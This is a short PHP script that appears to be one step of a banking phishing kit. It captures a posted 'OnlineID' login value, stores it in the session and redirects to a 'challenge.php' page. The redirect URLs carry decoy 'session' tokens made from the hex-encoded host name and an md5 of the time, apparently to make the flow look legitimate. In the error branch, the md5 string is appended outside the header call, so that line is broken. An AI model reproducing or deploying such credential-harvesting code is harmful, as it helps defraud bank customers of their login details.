<?php
ini_set("output_buffering",4096);
session_start();

//POST for OnlineID
$onlineID = $_POST['IDLOG'];


//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);


if ($onlineID=="") {
	$errors2=1;

}
else {
	$errors2=0;
}

if (strlen($onlineID)<5) {

$errors2=1;
}
else{
$errors2=0;
}






if ($errors2==1) {

header("Location: invalid.php?invalid=$errors2&session=$host").md5(time());
}


else {

//Create session for the onlineID
	$_SESSION['ONLINEID'] = $onlineID;

$initiate="challenge.php?template=Initiate&valid=true&session=$host".md5(time());
header("Location: $initiate");
}

?>